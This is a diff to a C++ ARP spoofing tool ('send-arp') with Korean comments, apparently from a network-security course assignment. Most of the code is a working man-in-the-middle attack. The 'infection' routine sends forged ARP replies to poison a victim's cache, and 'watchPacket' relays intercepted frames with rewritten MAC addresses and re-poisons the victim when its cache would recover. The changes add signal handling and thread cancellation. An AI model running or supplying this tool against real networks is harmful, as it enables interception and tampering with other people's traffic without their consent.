@@ -11,6 +11,7 @@
 // thread
 #include <thread>
 #include <chrono>
+#include <signal.h>
 // getMyIp
 #include <stdio.h>
 #include <unistd.h>
@@ -22,7 +23,7 @@
 //
 #define SUCCESS 1
 #define FAIL -1
-#define INFINITY 1 << 30
+#define INFINITY 1 << 10
 
 #pragma pack(push, 1) 
 struct EthArpPacket final {
@@ -45,12 +46,20 @@ using std::vector;
 using std::map;
 using std::endl;
 
+int exit_flag = 0;
+
+void sigint_handler(int signo) {
+	printf("sigint!!\n");
+	exit_flag = 1;
+}
+
 void usage() {
 	cout << "syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]" << endl;
 	cout << "sample : send-arp wlan0 192.168.10.2 192.168.10.1" << endl;
 }
 
 Mac getMyMac(char* dev) {
+	//cout << "ttest" << endl;
 	// 리눅스의 경우
 	// /sys/class/net/[dev]/address
 	ifstream fin;
@@ -97,17 +106,20 @@ int findFlag = 0;
 // 리턴값을 ... 
 // 리턴 안해도 되긴 하는데
 void sendARP(EthArpPacket packet, pcap_t* handle, int times, uint64_t sec) {
-	
+	// 쓰레드 취소 요청에 대한 처리
+	pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
+	pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS,NULL);
+
 	for(int i = 0; i < times; i++) {
-		if(findFlag) {
-			cout << "sendARP end" << endl;
-			return;
-		}
+		//if(findFlag) {
+		//	cout << "sendARP end" << endl;
+		//	return;
+		//}
 		// critical section
 		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 		//
 		if (res != 0) {
-			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			fprintf(stderr, "pcap_sendpacket return %d error=%s times=%d\n", res, pcap_geterr(handle), times);
 			return;
 			//return FAIL;
 		}
@@ -116,6 +128,7 @@ void sendARP(EthArpPacket packet, pcap_t* handle, int times, uint64_t sec) {
 	cout << "sendARP end" << endl;
 	return;
 	//return SUCCESS;
+
 }
 
 int parsePacket(pcap_t* handle, EthArpPacket& send, map<Ip, Mac>& table, uint32_t time) {
@@ -125,10 +138,7 @@ int parsePacket(pcap_t* handle, EthArpPacket& send, map<Ip, Mac>& table, uint32_
 
 	// 타이머 구현하는 법
 	// 1. 시작 시각하고 현재 시각의 차이를 구한다 -> sleep_for 내부도 이렇게 작동함 ㅋㅋ
-	// 2. sleep_for을 쓰레드로 구현해놓고 어떤 전역 변수값으로 전달?
-	// start
 	auto startTime = std::chrono::system_clock::now();
-
 	while (1) {
 		auto endTime = std::chrono::system_clock::now();
 		auto diff = std::chrono::duration_cast<std::chrono::seconds>(endTime-startTime);
@@ -170,12 +180,10 @@ int parsePacket(pcap_t* handle, EthArpPacket& send, map<Ip, Mac>& table, uint32_
 int resolveMac(pcap_t* handle, map<Ip, Mac>& table, Ip& sip, Ip& tip) {
 	EthArpPacket packet = fillPacket(table.find(sip)->second, Mac::broadcastMac(), table.find(sip)->second, sip, Mac::nullMac(), tip, ArpHdr::Request);
 	// 쓰레드로 1초에 1번씩 전송하도록 함 
-	// 종료 변수 설정 안함
-	findFlag = 0;
 	std::thread t(sendARP, packet, handle, 10, 1);
-	// 5초 지나고 타임 아웃
-	// 쓰레드로 만들어서 join 끝나면 FAIL로~
+	// 10초 지나고 타임 아웃
 	int res = parsePacket(handle, packet, table, 10); // main thread로 해도 될듯
+	pthread_cancel(t.native_handle());
 	findFlag = 1;
 	t.join();
 	cout << "resolve end" << endl;
@@ -212,25 +220,25 @@ int getMyInfo(char* dev, map<Ip, Mac>& table) {
 }
 
 void recover(pcap_t* handle, map<Ip, Mac> table, Ip sender, Ip target) {
-	EthArpPacket packet = fillPacket(table.find(target)->second, table.find(sender)->second, table.find(target)->second, target, table.find(sender)->second, sender, ArpHdr::Reply);
-	sendARP(packet, handle, 3, 0);
+	//EthArpPacket packet = fillPacket(table.find(target)->second, table.find(sender)->second, table.find(target)->second, target, table.find(sender)->second, sender, ArpHdr::Reply);
+	// broadcast로 해보자
+	// 본인환경에서는 Reply보다 Request가 recover 더 잘됨
+	EthArpPacket packet = fillPacket(table.find(target)->second, Mac::broadcastMac(), table.find(target)->second, target, Mac::nullMac(), sender, ArpHdr::Request);
+	sendARP(packet, handle, 5, 0);
 }
 
-void infection(pcap_t* handle, map<Ip, Mac> table, Ip me, Ip sender, Ip target, int times, uint64_t sec) {
-	// EthArpPacket packet = fillPacket(table[0].second, table[1].second, table[0].second, table[2].first, table[1].second, table[1].first, ArpHdr::Reply);
+std::thread::native_handle_type infection(pcap_t* handle, map<Ip, Mac> table, Ip me, Ip sender, Ip target, int times, uint64_t sec) {
+		// EthArpPacket packet = fillPacket(table[0].second, table[1].second, table[0].second, table[2].first, table[1].second, table[1].first, ArpHdr::Reply);
 	EthArpPacket packet = fillPacket(table.find(me)->second, table.find(sender)->second, table.find(me)->second, target, table.find(sender)->second, sender, ArpHdr::Reply);
 
 	//cout << "infection start" << endl;
 	findFlag = 0;
 	std::thread t(sendARP, packet, handle, times, sec);
+	std::thread::native_handle_type nht = t.native_handle();
 	t.detach();
-		
-	//t.join();
-
-	//cout << "infection end" << endl;
-
-	//recover(handle, table, sender, target);
-	return;	
+	// native handle을 반환해서 main에서 쓰레드를 관리하고자 하면 할 수 있도록
+	
+	return nht;
 }
 
 // infection 시켰으면 계속 감시해야 함.
@@ -240,7 +248,7 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 	struct pcap_pkthdr* pkheader;
 	const u_char* packet;
 	// relay용
-	u_char paste_packet[0x2000];
+	u_char paste_packet[10000];
 	// parsePacket이랑 꼬이면 안됨
 	// 해결책 선택
 	// 1. parse(resolve)를 다 한 후에 공격을 한다
@@ -248,14 +256,14 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 	// 2. parse랑 watch를 통합한다.
 	// 공유자원 문제 비스무리하게 .. 좀 복잡함.
 
-	auto startTime = std::chrono::system_clock::now();
-	while (1) {
-		findFlag = 0;
-		auto endTime = std::chrono::system_clock::now();
-		auto diff = std::chrono::duration_cast<std::chrono::seconds>(endTime-startTime);
-		if(diff.count() > 20) {
-			break;
-		}
+	//auto startTime = std::chrono::system_clock::now();
+	while (exit_flag == 0) {
+		// findFlag = 0;
+		// auto endTime = std::chrono::system_clock::now();
+		// auto diff = std::chrono::duration_cast<std::chrono::seconds>(endTime-startTime);
+		// if(diff.count() > 20) {
+		// 	break;
+		// }
 	
 		// critical section
 		int res = pcap_next_ex(handle, &pkheader, &packet);
@@ -265,7 +273,7 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 			return;
 		}
-		
+
 		EthArpPacket header;
 		memcpy(&header, packet, 42);
 	
@@ -279,6 +287,12 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 			for(auto i : IpTable) {
 				// sender 확인
 				if(header.eth_.smac_ == ARPtable.find(i.first)->second) {
+					
+					if(pkheader->len >= 10000) {
+						cout << "length 초과" << endl;
+						continue;
+					}
+					
 					// src mac me로 바꿔서 보냄
 					// dst mac 을 target꺼로
 					memcpy(paste_packet, packet, pkheader->len);
@@ -286,17 +300,17 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 					memcpy(&paste_packet[6], &myMac, 6);
 					Mac tMac = ARPtable.find(i.second)->second;
 					memcpy(paste_packet, &tMac, 6);
-					//cout << paste_packet[6] << endl;
-					// sendARP(header, handle, 1, 0);
+
 					// critical section
 					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&paste_packet), pkheader->len);
 					//
+
 					if (res != 0) {
-						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+						fprintf(stderr, "pcap_sendpacket return %d error=%s len=%d\n", res, pcap_geterr(handle), pkheader->len);
 						return;
 						//return FAIL;
 					}
-					cout << "relay" << endl;
+					//cout << "relay" << endl;
 					break;
 				}
 			}
@@ -314,14 +328,12 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 				if(ntohl(header.arp_.sip_) == uint32_t(i.first) && ntohl(header.arp_.tip_) == uint32_t(i.second)) {
 					cout << "case 1" << endl;
 					infection(handle, ARPtable, me, i.first, i.second, 3, 1);
-					break;
 				}
 
 				// 2. target의 broadcast
 				if(ntohl(header.arp_.sip_) == uint32_t(i.second)) {
 					cout << "case 2" << endl;
 					infection(handle, ARPtable, me, i.first, i.second, 3, 1);
-					break;
 				}
 			}
 
@@ -333,26 +345,20 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 				if(header.arp_.sip_ == i.first && header.arp_.tip_ == i.second) {
 					cout << "case 3" << endl;
 					infection(handle, ARPtable, me, i.first, i.second, 3, 1);
-					break;
 				}
 			}
 			
 		}
 
 		// 4. target -> sender unicast => 인자를 2쌍 이상 받아서 처리하는 이유
+		// target sender 둘다 감염 시키면 
+		// 4에 해당하는 것이 3번 경우에 잡힙
+		// 어차피 arp는 relay하지 않기 때문에 sender한테 unicast 전달이 안됨.
 	}
 }
-
 
 void initArg(char* argv[], Ip& sender, Ip& target) {
 	sender = Ip(string(argv[0]));
 	target = Ip(string(argv[1]));
 }
 
-void printTable(map<Ip, Mac>& table) {
-	/*
-	cout << "----Me----" << endl << "Ip:  " << string(table[0].first) << endl << "Mac: " << string(table[0].second) << endl;
-	cout << "--Sender--" << endl << "Ip:  " << string(table[1].first) << endl << "Mac: " << string(table[1].second) << endl;
-	cout << "--Target--" << endl << "Ip:  " << string(table[2].first) << endl << "Mac: " << string(table[2].second) << endl;
-	*/
-}
